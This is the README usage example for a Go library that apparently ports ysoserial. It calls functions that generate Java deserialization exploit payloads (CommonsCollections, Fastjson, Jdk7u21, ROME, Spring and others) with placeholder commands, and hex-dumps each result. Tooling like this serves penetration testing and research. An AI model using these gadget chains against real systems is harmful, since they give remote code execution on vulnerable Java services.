# Usage example

```go
package main

import (
	"encoding/hex"
	"fmt"
        "github.com/nu1r/GlangYsoserial"
)

func main() {
	// If you need to use a Gadget implemented by the TemplatesImpl class, you can call the return value of the TemplatesImpl function as a parameter.
	// 命令超过15个字符请另行实现此处，否则字节不对其。
	fmt.Println(hex.Dump(ysoserial.TemplatesImpl("example command")))

	fmt.Println(hex.Dump(ysoserial.URLDNS("example domain")))
	fmt.Println(hex.Dump(ysoserial.Click1([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.Clojure("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsBeanutils1([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsBeanutils2([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections1("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections2([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections3([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections4([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections5("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections6("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections7("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections8([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections9("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections10([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections11("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollections12("example command")))
	fmt.Println(hex.Dump(ysoserial.CommonsCollectionsK1([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.CommonsCollectionsK2([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.Fastjson1([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.Fastjson2([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.Groovy1("example command")))
	fmt.Println(hex.Dump(ysoserial.Jdk7u21([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.Jdk8u20([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.JSON1([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.ROME([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.ROME2([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.ROME3([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.Spring1([]byte("example bytes"))))
	fmt.Println(hex.Dump(ysoserial.Spring2([]byte("example bytes"))))
}

```
</code></pre>
</details>
